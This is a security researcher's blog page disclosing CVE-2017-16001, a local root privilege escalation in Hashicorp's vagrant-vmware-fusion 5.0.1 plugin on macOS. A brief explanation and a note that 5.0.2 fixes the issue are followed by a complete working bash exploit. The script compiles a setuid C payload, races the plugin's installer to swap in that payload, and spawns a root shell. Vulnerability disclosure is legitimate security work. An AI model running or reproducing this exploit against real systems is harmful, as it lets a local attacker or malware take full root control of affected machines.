<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
        <link rel="stylesheet" type="text/css" href="/css/style.css" />
        <link rel="alternate" type="application/rss+xml" title="m4.rkw.io blog" href="http://m4.rkw.io/blog/rss" />
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
        <script src='https://www.google.com/recaptcha/api.js'></script>
        <script src="/js/site.js"></script>
        <title>Mark Wadham</title>
    </head>
    <body>
        <div id="menu">
                        <h3>Mark Wadham</h3>
            <ul>
                <li><a href="/index.html">profile</a></li>
                <li><a href="/blog.html">blog</a> <a href="/blog/rss"><img src="/img/rss.png" /></a></li>
                <li><a href="/cves.html">CVEs</a></li>
                <li><a href="/jsdemos.html">js demos</a></li>
                <li><a href="/contact.html">contact</a></li>
                <li class="space small">twitter: <a href="https://twitter.com/m4rkw">m4rkw</a></li>
                <li class="small">github: <a href="https://github.com/m4rkw">m4rkw</a></li>
                <li class="small">linkedin: <a href="https://uk.linkedin.com/in/mark-wadham-14ab49a6">379069834</a></li>
                <li class="red space small"></li>
            </ul>

        </div>
        <div id="content">
            <div id="main-content">
                                            <div class="post">
                <h2><a href="/blog/cve201716001-local-root-privesc-in-hashicorp-vagrantvmwarefusion-501.html">CVE-2017-16001 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.1</a></h2>
                <h3>3 Nov 2017 08:21  | <a class="tag" href="/blog/tag/macOS.html">macOS</a> | <a class="tag" href="/blog/tag/security.html">security</a> | <a class="tag" href="/blog/tag/exploits.html">exploits</a></h3>
                  <pre>I recently blogged about how the installation process of version 5.0.0 of this
plugin could be hihacked by a local attacker or malware in order to escalate
privileges to root.  Hashicorp pushed some mitigations for this issue fairly
quickly but unfortunately 5.0.1 is still exploitable with a slightly different
approach.

They removed the chmod/chown shell commands from their osascript invocation and
instead simply executed their installer as root, but apparently didn&#39;t realise
that the installer is not root-owned so can be swapped out by a local attacker
during the process.

This issue is fixed in version 5.0.2.

<a href="https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt">https://m4.rkw.io/vagrant_vmware_privesc_5.0.1.sh.txt</a>
c38ecc9fdb4f37323338e8fd12b851133a2121f3505cde664e6d32f1ef49ba23
-----------------------------------------------------------------------------
#!/bin/bash
echo &quot;########################################&quot;
echo &quot;vagrant_vmware_fusion 5.0.1 root privesc&quot;
echo &quot;by m4rkw&quot;
echo &quot;########################################&quot;
echo
echo &quot;compiling...&quot;

cat &gt; vvf.c &lt;&lt;EOF
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
int main(int ac, char *av[])
{
  setuid(0);
  seteuid(0);
  if (ac &gt; 1) {
    system(&quot;mv -f $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 /tmp/vvf_exp&quot;);
    system(&quot;chown root:wheel /tmp/vvf_exp&quot;);
    system(&quot;chmod 4755 /tmp/vvf_exp&quot;);
    system(&quot;mv -f $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64.orig $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64&quot;);
    system(&quot;$HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop/vagrant-vmware-installer_darwin_amd64 install\012&quot;);
    return 0;
  }
  system(&quot;rm -f /tmp/vvf_exp&quot;);
  execl(&quot;/bin/bash&quot;,&quot;bash&quot;,NULL);
  return 0;
}
EOF

gcc -o /tmp/vvf_exp vvf.c
rm -f vvf.c

echo &quot;waiting for user to initiate vagrant plugin update...&quot;

while :
do
  r=`ps auxwww |grep &#39;/usr/bin/osascript -e do shell script&#39; |grep &#39;vagrant-vmware-installer_darwin_amd64&#39;`
  if [ &quot;$r&quot; != &quot;&quot; ] ; then
    break
  fi
done

pid=`ps auxww |grep &#39;./vagrant-vmware-installer_darwin_amd64 install&#39; |grep -v grep |xargs -L1 |cut -d &#39; &#39; -f2`

cd $HOME/.vagrant.d/gems/2.3.4/gems/vagrant-vmware-fusion-5.0.1/ext/vagrant-vmware-desktop

echo &quot;dropping payload in place of installer binary...&quot;

mv -f vagrant-vmware-installer_darwin_amd64 vagrant-vmware-installer_darwin_amd64.orig
mv -f /tmp/vvf_exp vagrant-vmware-installer_darwin_amd64

echo &quot;waiting for payload to trigger...&quot;

while :
do
  r=`ls -la /tmp/vvf_exp 2&gt;/dev/null |grep -- &#39;-rwsr-xr-x&#39; |grep root`
  if [ &quot;$r&quot; != &quot;&quot; ] ; then
    echo &quot;spawning shell...&quot;
    /tmp/vvf_exp
    exit 0
  fi
done</pre>
            </div>


            </div>
            <div id="right-content">
                
            <ul>
              <li>&nbsp;&nbsp;<a href="/blog.html">all posts</a>
            </ul>

            <ul>
              <li>&nbsp;&nbsp;[year]</li>
                <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/2018.html">2018</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/2017.html">2017</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/2016.html">2016</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/2015.html">2015</a></li>
            </ul>

            <ul>
              <li>&nbsp;&nbsp;[tag]</li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/AWS.html">AWS</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/agile.html">agile</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/apple.html">apple</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/bash.html">bash</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/cryptocurrency.html">cryptocurrency</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/development.html">development</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/exploits.html">exploits</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/iOS.html">iOS</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/linux.html">linux</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/macOS.html">macOS</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/mining.html">mining</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/mysql.html">mysql</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/php.html">php</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/ruby.html">ruby</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/scrum.html">scrum</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/security.html">security</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/touchID.html">touchID</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/vim.html">vim</a></li>
                <li>&nbsp;&nbsp;<a href="/blog/tag/work.html">work</a></li>
            </ul>

            </div>
        </div>
				<script>
						(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
						(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
						m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
						})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

						ga('create', 'UA-91604161-1', 'auto');
						ga('send', 'pageview');
				</script>
    </body>
</html>
